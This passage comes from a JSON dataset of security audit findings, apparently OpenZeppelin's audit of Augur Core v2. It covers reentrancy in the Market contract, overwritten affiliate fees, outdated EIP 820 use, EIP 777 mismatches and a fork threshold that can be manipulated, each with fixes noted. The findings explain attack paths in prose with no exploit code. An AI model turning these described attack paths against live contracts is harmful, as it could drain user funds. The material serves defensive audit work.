[*`9f6ca45`*](https://github.com/AugurProject/augur/commit/9f6ca4515a1eacd859a22aad87d9564a8aa49e4a).",
      "summary": "\nThis bug report is about a potential vulnerability in the Augur codebase that could expose serious reentrancy issues. The vulnerability is related to the Check-Effects-Interactions Pattern, which is recommended by Solidity and is used to avoid potential vulnerabilities, such as reentrancy. \n\nThe vulnerability is related to the fact that in several locations throughout the Augur codebase, calls to external, potentially attacker-controlled, contracts are made *before* making the necessary checks and modifications in the contract’s storage. This could potentially expose the system to reentrancy attacks. \n\nIt is important to strictly follow the Check-Effects-Interactions Pattern in systems like Augur where most of the token transfers involve ERC777-like tokens, which explicitly call hook functions in the sender and receiver of each transfer operation. Therefore, the development team must ensure all interactions with external contracts are performed after all checks and state changes are made. \n\nSome instances of this issue have already been fixed in the 9f6ca45 commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11510",
      "title": "[H04] Reentrancy vulnerabilities in Market contract",
      "impact": "HIGH",
      "content": "In the [`Market`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol) there are two reentrancy issues that allow for the removal of all of the contract’s REP tokens. In the contract’s current state, neither of these issues are exploitable because the contract never holds a REP token balance beyond the `repBond` being transferred in both instances.\n\n\nIn the [`disavowCrowdsourcers`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L415-L416) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L415-L416), the `repBond` is transferred to the `repBondOwner` before the `repBond` is set to `0`. Because it is an ERC777-like transfer, the [`tokensReceived`](https://eips.ethereum.org/EIPS/eip-777#erc777tokensrecipient-and-the-tokensreceived-hook) [hook](https://eips.ethereum.org/EIPS/eip-777#erc777tokensrecipient-and-the-tokensreceived-hook) is called on `repBondOwner` if `repBondOwner` is an ERC820-registered contract. Should the `repBondOwner` address actually be an attacker-controlled contract, it could reenter the `Market` contract by calling back into the `disavowCrowdsourcers` function from the `tokensReceived` hook and continue to do this until all REP tokens are drained from the market.\n\n\nA similar issue was identified in the [`distributeInitialReportingRep`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L150-L156) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L150-L156). In this case, the attacker could call the [`doInitialReport`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L127) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L127) which calls the [`doInitialReportInternal`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L132) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L132), which in turn calls the [`distributeInitialReportingRep`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L146) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L146), finally executing an [ERC777-like transfer](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L152) to the designated reporter address. In a scenario where the designated reporter address is a malicious attacker-controlled contract, it could reenter the `Market` contract by calling back into the `doInitialReport` function and continue to do so until all REP has been drained from the market.\n\n\nDespite neither of these vulnerabilities being exploitable, as in the current implementation the amount of REP held in a market is limited to the `repBond`, precautions should be taken to prevent an exploitable vulnerability from being introduced in the future. In this regard, consider always following the [Checks-Effects-Interactions](https://solidity.readthedocs.io/en/v0.5.4/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to mitigate the chances of calls to external addresses resulting in an exploitable reentrancy vulnerability.\n\n\n***Update****: fixed in* [*`c6eed38`*](https://github.com/AugurProject/augur/commit/c6eed38e36d2ca6f11d26175df05d9284e830936). *Transfers of REP tokens in the* *`Market`* *contract no longer call the ERC777 hooks.*",
      "summary": "\nThis bug report is about a reentrancy issue in the Market contract of the AugurProject. The issue allows for the removal of all of the contract’s REP tokens. The reentrancy issue was identified in two functions, disavowCrowdsourcers and distributeInitialReportingRep. In both functions, a REP token balance is transferred to the repBondOwner before the repBond is set to 0. If the repBondOwner address is an attacker-controlled contract, it could reenter the Market contract by calling back into the functions from the tokensReceived hook and continue to do this until all REP tokens are drained from the market. \n\nThe issue is not exploitable in the current implementation as the amount of REP held in a market is limited to the repBond. However, precautions should be taken to prevent an exploitable vulnerability from being introduced in the future. The Checks-Effects-Interactions pattern should be followed to mitigate the chances of calls to external addresses resulting in an exploitable reentrancy vulnerability. \n\nThe bug has been fixed in c6eed38, where transfers of REP tokens in the Market contract no longer call the ERC777 hooks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11509",
      "title": "[H03] Affiliate fees are not accumulated in multiple trading operations",
      "impact": "HIGH",
      "content": "In Augur v2, market creators can set an [`affiliateFeeDivisor`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L45) value which corresponds to the proportion of market creator fees that will be assigned to the [market’s affiliate](https://www.augur.net/blog/augur-v2/#affiliate) when trading occurs.\n\n\nFor this purpose, the `Market` contract implements the function [`recordMarketCreatorFees`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L295), which can only be called by [“known fee senders”](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L296) and is in charge of [calculating](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L297-L302) the amount of fees to be assigned to the creator and the affiliate (if exists). As trading can occur multiple times in a market, this function is expected to be called multiple times with fees for creator and affiliates [accumulating](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L302) each time, and it should distribute the fees to the corresponding parties [only when the market is finalized](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L303).\n\n\nHowever, while the fees are [correctly accumulated](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L302) for market creators, [affiliates’ fees are instead overwritten](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L299) (*i.e.* they are assigned to the `affiliateFeesAttoCash` mapping while they should be added using `affiliateFeesAttoCash[_affiliateAddress] = affiliateFeesAttoCash[_affiliateAddress].add(_affiliateFees);` ). As a consequence, if more than one trading operation of shares occurs in a market involving the same affiliate address, the affiliate will receive less fees than expected once the market is finalized.\n\n\nConsider accumulating affiliate fees the same way market creators fees are currently accumulated. Furthermore, it is highly recommended to include unit tests that cover the described scenario, so as to make sure this issue is not reintroduced in future changes to the code base.\n\n\n***Update****: fixed in* *[`1b07fa4`](https://github.com/AugurProject/augur/commit/1b07fa4ee7c763d2c85230a4d3eaeaae0077f884#diff-8ed676c60e9fab2fdbd79f09555a59be).* *Affiliate fees are now properly incremented.*",
      "summary": "\nAugur v2 is a decentralized prediction market platform. Market creators can set an ‘affiliateFeeDivisor’ value which corresponds to the proportion of market creator fees that will be assigned to the market’s affiliate when trading occurs. The ‘Market’ contract implements the ‘recordMarketCreatorFees’ function which calculates the amount of fees to be assigned to the creator and the affiliate but a bug was discovered where the fees for the affiliate were being overwritten instead of accumulated with each trading operation. This would result in the affiliate receiving less fees than expected once the market was finalized. To fix this, the bug was fixed by accumulating the affiliate fees in the same way the market creator fees were being accumulated. Unit tests were also added to make sure this issue is not reintroduced in future changes.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11508",
      "title": "[H02] EIP 820 implementation must be updated to EIP 1820",
      "impact": "HIGH",
      "content": "[EIP 1820](https://github.com/ethereum/EIPs/pull/1820) has superseded [EIP 820](https://github.com/ethereum/EIPs/issues/820), the former being the latter’s adaptation for Solidity 0.5, due to [a bug](https://github.com/ethereum/EIPs/issues/820#issuecomment-452465748) that was found in [ERC820](https://eips.ethereum.org/EIPS/eip-820) which would prevent certain calls made in the [`staticcall`](https://github.com/jbaylina/ERC820/blob/master/contracts/ERC820Registry.sol#L201) to never return a `true`.\n\n\nTherefore, consider updating the specification to [ERC1820](https://eips.ethereum.org/EIPS/eip-1820). This will update the [`insize`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/ERC820Registry.sol#L149) [parameter of the](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/ERC820Registry.sol#L149) [`staticcall`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/ERC820Registry.sol#L149) from `0x08` to `0x24`. Contracts in [`ERC820Implementer.sol`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/ERC820Implementer.sol), [`IERC820Registry.sol`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/IERC820Registry.sol)[`ERC820Registry.sol`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/ERC820Registry.sol), [`ReputationToken.sol`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L28), [`DisputeWindow.sol`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeCrowdsourcer.sol#L20), and a number of other contracts using the ERC820 registry must all be updated to reflect the changes.\n\n\n***Update****: the ERC820 contract has been replaced with the ERC1820 contract in* [*`484e3ac`*](https://github.com/AugurProject/augur/commit/484e3ac8c3ae077797941d763ac2fc80dabf4161).",
      "summary": "\nA bug was found in the Ethereum Request for Comment (ERC) 820 which would prevent certain calls made in the \"staticcall\" from returning a \"true\". As a result, ERC 1820 was created as an adaptation for Solidity 0.5 to replace ERC 820. \n\nThe \"insize\" parameter of the \"staticcall\" must be updated from \"0x08\" to \"0x24\" in the contracts \"ERC820Implementer.sol\", \"IERC820Registry.sol\", \"ERC820Registry.sol\", \"ReputationToken.sol\", and \"DisputeWindow.sol\". The ERC1820 contract can be found in the Github commit \"484e3ac8c3ae077797941d763ac2fc80dabf4161\". \n\nIt is important to update the ERC820 contracts to the new ERC1820 contract to prevent the bug from occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11507",
      "title": "[H01] Implementation of EIP 777 does not fully match the specification",
      "impact": "HIGH",
      "content": "The following mismatches between the [EIP 777 specification](https://eips.ethereum.org/EIPS/eip-777) and the related implementation contracts (*i.e.* [`ERC777Token`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777Token.sol), [`ERC777BaseToken`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777BaseToken.sol), [`ERC777TokensRecipient`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777TokensRecipient.sol) and [`ERC777TokensSender`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777TokensSender.sol)) were identified.\n\n\n* In [`ERC777Token`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777Token.sol), the following functions are missing from the ERC777 interface: `name()`, `symbol()`, `totalSupply()`, `balanceOf(address)`, `granularity()`, `burn(uint256,bytes)` and `operatorBurn(address,uint256,bytes,bytes)`. It is worth highlighting that `burn(uint256,bytes)` and `operatorBurn(address,uint256,bytes,bytes)` are the only functions never implemented in child contracts.\n* In [`ERC777Token`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777Token.sol), [`ERC777TokensSender`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777TokensSender.sol) and [`ERC777TokensRecipient`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777TokensRecipient.sol), all function and event parameters defined as type `bytes32` should be defined as `bytes`.\n* In [`ERC777Token`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777Token.sol), the `authorizeOperator(address)`, `revokeOperator(address)`, `send(address,uint256,bytes)` and `operatorSend(address,address,uint256,bytes,bytes)` functions return a success `bool` while the EIP 777 standard does not specify a return value for any of those functions.\n* The [`ERC777BaseToken`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777BaseToken.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777BaseToken.sol) does not implement the `burn(uint256,bytes)` and `operatorBurn(address,uint256,bytes,bytes)` functions, which as mentioned, are missing from the [`ERC777Token`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777Token.sol) interface. Augur developers acknowledge this situation in [an inline comment](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777Token.sol#L17).\n* The [`ERC777BaseToken`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777BaseToken.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777BaseToken.sol) implements a public [`sendNoHooks`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777BaseToken.sol#L49) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777BaseToken.sol#L49) that allows the caller to transfer tokens bypassing the `tokensReceived` and `tokensToSend` hooks of the sender and receiver, a feature [completely opposite to the EIP 777 specification](https://eips.ethereum.org/EIPS/eip-777#sending-tokens).\n* The [`mint`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/VariableSupplyToken.sol#L13) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/VariableSupplyToken.sol#L13) of `VariableSupplyToken` does not call the [`callRecipient`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777BaseToken.sol#L122) function of `ERC777BaseToken`, thus never calling the receiver’s `tokensReceived` hook. According to [the EIP 777 spec](https://eips.ethereum.org/EIPS/eip-777#minting-tokens), calling such hook is a MUST when minting tokens.\n* The [`Minted`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777Token.sol#L29) [event](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777Token.sol#L29) defined in `ERC777Token` is never emitted when minting tokens in the [`mint`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/VariableSupplyToken.sol#L13) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/VariableSupplyToken.sol#L13) of `VariableSupplyToken`. According to [the EIP 777 spec](https://eips.ethereum.org/EIPS/eip-777#minting-tokens), emitting such event is a MUST when minting tokens.\n* According to the spec, the `tokensToSend` hook MUST be called *before* the token’s state is updated. Similarly, the `tokensReceived` hook MUST be called *after* the token’s state is updated. However, the function [`transferFrom`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/StandardToken.sol#L26) of the `StandardToken` contract [modifies the token’s state](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/StandardToken.sol#L31) (*i.e.* the allowances) before the `tokensToSend` hook is called.\n\n\nMany of these particular noncompliances seem to be known by Augur’s development team, who still decided to move forward with their custom implementation of EIP 777. This kind of decisions come with trade-offs. While the deviations from the spec may be more suitable for the Augur protocol, they might potentially cause errors in clients interacting with Augur that expect a fully-compliant implementation of the EIP 777. Therefore, it is advisable to either avoid calling the implemented token ERC777 altogether (its similarities and differences with the standard spec could be described in end-user documentation), or instead fully comply with the EIP’s specification by following [OpenZeppelin’s ERC777 implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/tree/v2.3.0/contracts/token/ERC777), released in the 2.3.0 version.\n\n\n***Update:*** *in an* [*attempt to fix*](https://github.com/AugurProject/augur/pull/2510) *this issue, where the* *`mint`* *function of the* *`VariableSupplyToken`* *was modified to call the ERC777* *`tokensReceived`* *hook, a critical regression error has been introduced. The* *`migrateBalanceFromLegacyRep`* *function of the* *`OldLegacyRepToken`* *contract must be called for every token holder to complete the migration, and as* *`mint`* *now calls the* *`tokensReceived`* *hook, any holder can revert attempts to mint new tokens for them. As a result, malicious tokens holders can prevent the migration from finishing (i.e. potentially never allowing the* *`isMigratingFromLegacy`* *flag to be set to* *`false`**).*",
      "summary": "\nThis bug report is regarding the implementation of EIP 777, a standard for tokens on the Ethereum network, and the related contracts. Specifically, the report identifies mismatches between the EIP 777 specification and the related implementation contracts. These include missing functions, incorrect parameter types, return values that are not specified in the EIP 777 standard, and functions that do not follow the EIP 777 specification. Augur developers acknowledge some of these mismatches in an inline comment.\n\nIn addition, the report states that a critical regression error was introduced when an attempt was made to fix the issue, where the mint function of the VariableSupplyToken was modified to call the ERC777 tokensReceived hook. This allowed malicious token holders to prevent the migration from finishing, potentially never allowing the isMigratingFromLegacy flag to be set to false.\n\nIn order to fix this issue, it is recommended to either avoid calling the implemented token ERC777 altogether, or to follow OpenZeppelin’s ERC777 implementation which is released in the 2.3.0 version.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11506",
      "title": "[C08] Fork reputation goal threshold can be decreased during fork",
      "impact": "HIGH",
      "content": "Once a universe is forking, all REP token holders are expected to migrate out their entire REP balance to one of the child universes. The migration of tokens can be accomplished calling the [`migrateOut`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L48) or [`migrateOutByPayout`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L39) functions in the `ReputationToken` contract corresponding to the forking universe. These will then trigger the [burning of REP tokens in the forking universe](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L51), and by calling the [`migrateIn`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L52) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L52) of the child universe’s REP token, the corresponding REP tokens [will be minted](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L60) in the child universe. The forking stage will be considered finished either when a certain amount of REP tokens have been migrated (*i.e.* [`forkReputationGoal`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L31) tokens) to a child universe (which will be considered the winning child universe), or when a fixed amount of time has passed (*i.e.* when the system’s time is greater than [`forkEndTime`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L30)).\n\n\nWhile the `forkReputationGoal` was expected to be a fixed threshold during a fork, an attack vector has been identified in a second-generation forking universe where any malicious user can turn the `forkReputationGoal` into an ever-decreasing moving target, thus dangerously allowing a holder of tokens to potentially manipulate the outcome of a fork in an unintended way.\n\n\nConsider a Universe B, winning child of a locked Universe A that forked in the past (*i.e.* in Universe B, `augur.getTimestamp() >= parentUniverse.getForkEndTime()` equals `true`). Now consider that the Universe B is forking to several universes, but still has not settled on which child universe is the winning one; that is, users are actively migrating their Universe-B-REP tokens to one of the many child universes by calling the [`migrateOut`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L48) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L48) of the Universe-B-REP token. Therefore, the total supply of Universe-B-REP tokens is decreasing (because Universe-B-REP tokens are [burned](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L51)).\n\n\nThe `ReputationToken` contract implements the [`updateTotalTheoreticalSupply`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L153) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L153) that can be called by anyone at any time. In our scenario, calling this function will always execute [line 157](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L156-L157) of `ReputationToken.sol`, thus updating the `totalTheoreticalSupply` of Universe-B-REP tokens to the last registered `totalSupply` of tokens. This means that, as the `totalSupply` of Universe-B-REP tokens is decreasing due to tokens being migrated and burned, the `totalTheoreticalSupply` will also decrease each time `updateTotalTheoreticalSupply` is called after at least one Universe-B-REP token is migrated out to a child universe.\n\n\nThe `Universe` contract implements the [`updateForkValues`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L79) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L79) that can be called by anyone at any time, and [updates the](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L80-L81) [`forkReputationGoal`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L80-L81) [with the last registered value of](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L80-L81) [`totalTheoreticalSupply`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L80-L81)`.` In our scenario, if the `updateForkValues` function is called in Universe B after calling `updateTotalTheoreticalSupply` in the Universe-B-REP token, then the `forkReputationGoal` threshold will be decreased, as the `totalTheoreticalSupply` was decreased (explained in previous paragraph).\n\n\nAs a consequence, any user can leverage the migration of Universe-B-REP tokens to effectively turn the `forkReputationGoal` threshold of Universe B into a moving target, thus each time requiring [less and less tokens for a child universe to be considered the winning universe](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L231), not only because the amount of REP migrated is increasing (which is expected), but also because the threshold is being lowered.\n\n\nConsider analyzing the need of having a public function that updates critical system parameters such as [`updateForkValues`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L79)`.` If it is to remain public to be called from off-chain clients, then its execution during a fork should be halted, making sure it is called one last time before entering the fork stage. As a starting point, one potential (untested) solution for this issue could be adding a `require(!isForking())` statement at the beginning of the [`updateForkValues`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L79) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L79), and adding a call to it in the [`fork`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L70) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L70) of the `Universe` contract. Regardless of the course of action taken, thorough unit tests to cover the described scenario should be included to prevent this issue from being reintroduced in future changes to the code base.\n\n\n***Update:*** *fixed in* *[`a9560f4`](https://github.com/AugurProject/augur/commit/a9560f44ea42db3fce4dedf8f238f91354aca265).* *The fork reputation goal threshold can no longer be changed once a fork has begun.*",
      "summary": "\nThis bug report is about a potential attack vector in a second-generation forking universe where any malicious user can turn the `forkReputationGoal` into an ever-decreasing moving target, thus dangerously allowing a holder of tokens to potentially manipulate the outcome of a fork in an unintended way. \n\nWhen a universe is forking, all REP token holders are expected to migrate out their entire REP balance to one of the child universes. This is done by calling the `migrateOut` or `migrateOutByPayout` functions in the `ReputationToken` contract corresponding to the forking universe. This will then trigger the burning of REP tokens in the forking universe and minting the corresponding REP tokens in the child universe. The forking stage is considered finished either when a certain amount of REP tokens have been migrated (`forkReputationGoal` tokens) to a child universe (the winning child universe) or when a fixed amount of time has passed (`forkEndTime`).\n\nThe bug is that the `ReputationToken` contract implements the `updateTotalTheoreticalSupply` function that can be called by anyone at any time. This will always execute line 157 of `ReputationToken.sol`, thus updating the `totalTheoreticalSupply` of Universe-B-REP tokens to the last registered `totalSupply` of tokens. This means that, as the `totalSupply` of Universe-B-REP tokens is decreasing due to tokens being migrated and burned, the `totalTheoreticalSupply` will also decrease each time `updateTotalTheoreticalSupply` is called after at least one Universe-B-REP token is migrated out to a child universe.\n\nThe `Universe` contract implements the `updateForkValues` function that can be called by anyone at any time, and updates the `forkReputationGoal` with the last registered value of `totalTheoreticalSupply`. If the `updateForkValues` function is called in Universe B after calling `updateTotalTheoreticalSupply` in the Universe-B-REP token, then the `forkReputationGoal` threshold will be decreased, as the `totalTheoreticalSupply` was decreased. This means that any user can leverage the migration of Universe-B-REP tokens to effectively turn the `forkReputationGoal` threshold of Universe",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
